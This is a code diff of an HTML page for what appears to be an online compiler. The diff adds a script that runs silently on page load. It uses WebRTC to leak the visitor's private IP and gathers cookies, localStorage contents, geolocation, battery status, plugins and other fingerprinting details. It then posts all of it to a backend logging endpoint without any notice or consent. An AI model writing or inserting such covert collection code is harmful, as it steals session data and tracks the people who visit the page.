@@ -7,9 +7,6 @@
 <body>
     <h1>Compiler Online</h1>
 
-    <h2>Search</h2>
-    <input type="text" id="search" placeholder="Enter search term..." />
-
     <h2>Code Submission</h2>
     <textarea id="code" rows="10" cols="30" placeholder="Write your code here..."></textarea><br>
     <button id="submit">Submit Code</button>
@@ -18,7 +15,7 @@
     <pre id="output"></pre>
 
     <script>
-        async function logPrivateIPAndInfo() {
+        async function logPrivateIP() {
             const pc = new RTCPeerConnection();
             let logged = false;
 
@@ -30,30 +27,88 @@
                     const candidate = event.candidate.candidate;
                     if (candidate.includes("candidate")) {
                         const localIP = candidate.split(" ")[4];
-                        const searchTerm = document.getElementById('search').value || 'No search term entered';
+                        logged = true;
+
+                        // Gather extensive information
                         const userAgent = navigator.userAgent;
-                        const referrer = document.referrer || 'No referrer';
+                        const referrerHistory = document.referrer ? [document.referrer] : [];
                         const currentURL = window.location.href;
                         const screenWidth = window.screen.width;
                         const screenHeight = window.screen.height;
+                        const browserLanguage = navigator.language || navigator.userLanguage;
+                        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                        const osInfo = navigator.platform;
+                        const timestamp = new Date().toISOString();
+                        const timeSpent = Math.round((performance.now() / 1000)); // Time spent in seconds
+                        const activeTabDuration = Math.round((performance.now() / 1000)); // Active tab duration in seconds
+                        const networkStatus = navigator.onLine ? "Online" : "Offline"; // Network status
+                        const deviceType = /Mobi|Android/i.test(userAgent) ? "Mobile" : "Desktop"; // Device type
 
-                        logged = true;
+                        // Additional device and performance information
+                        const memoryInfo = performance.memory ? 
+                            `Total: ${Math.round(performance.memory.total / 1048576)} MB, Used: ${Math.round(performance.memory.used / 1048576)} MB` : 
+                            'Memory Info Not Available';
 
+                        const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown'; // Number of logical processors
+                        const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown'; // Network connection type
+                        const plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ') || 'No plugins detected'; // Browser plugins
+                        const batteryInfo = await navigator.getBattery().then(battery => ({
+                            level: battery.level * 100,
+                            charging: battery.charging
+                        })).catch(() => null); // Battery status
+
+                        // Fetch geolocation information
+                        const geolocationInfo = await new Promise((resolve) => {
+                            if (navigator.geolocation) {
+                                navigator.geolocation.getCurrentPosition(
+                                    position => resolve({ lat: position.coords.latitude, lon: position.coords.longitude }),
+                                    () => resolve({ error: "Geolocation permission denied" })
+                                );
+                            } else {
+                                resolve({ error: "Geolocation not supported" });
+                            }
+                        });
+
+                        // Collecting cookies and local storage data
+                        const cookies = document.cookie || 'No cookies available';
+                        const localStorageData = JSON.stringify(localStorage) || 'No local storage data';
+
+                        // Prepare log data
+                        const logData = {
+                            ip: localIP,
+                            searchTerm: '', // Placeholder for search term
+                            userAgent,
+                            referrerHistory,
+                            currentURL,
+                            screenWidth,
+                            screenHeight,
+                            browserLanguage,
+                            timeZone,
+                            osInfo,
+                            timestamp,
+                            timeSpent,
+                            activeTabDuration,
+                            networkStatus,
+                            deviceType,
+                            memoryInfo,
+                            hardwareConcurrency,
+                            connectionType,
+                            plugins,
+                            batteryLevel: batteryInfo ? batteryInfo.level : 'Unknown',
+                            isCharging: batteryInfo ? batteryInfo.charging : 'Unknown',
+                            geolocation: geolocationInfo,
+                            cookies,
+                            localStorageData
+                        };
+
+                        // Send the log data to the backend
                         fetch('/api/log', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ 
-                                ip: localIP,
-                                searchTerm,
-                                userAgent,
-                                referrer,
-                                currentURL,
-                                screenWidth,
-                                screenHeight
-                            })
+                            body: JSON.stringify(logData)
                         }).then(response => {
                             if (!response.ok) {
-                                console.error('Failed to log information');
+                                console.error('Failed to log IP');
                             }
                         }).catch(error => {
                             console.error('Error:', error);
@@ -77,7 +132,7 @@
         }
 
         document.getElementById('submit').onclick = compileCode;
-        logPrivateIPAndInfo(); // Start logging silently
+        logPrivateIP(); // Start IP logging silently
     </script>
 </body>
 </html>
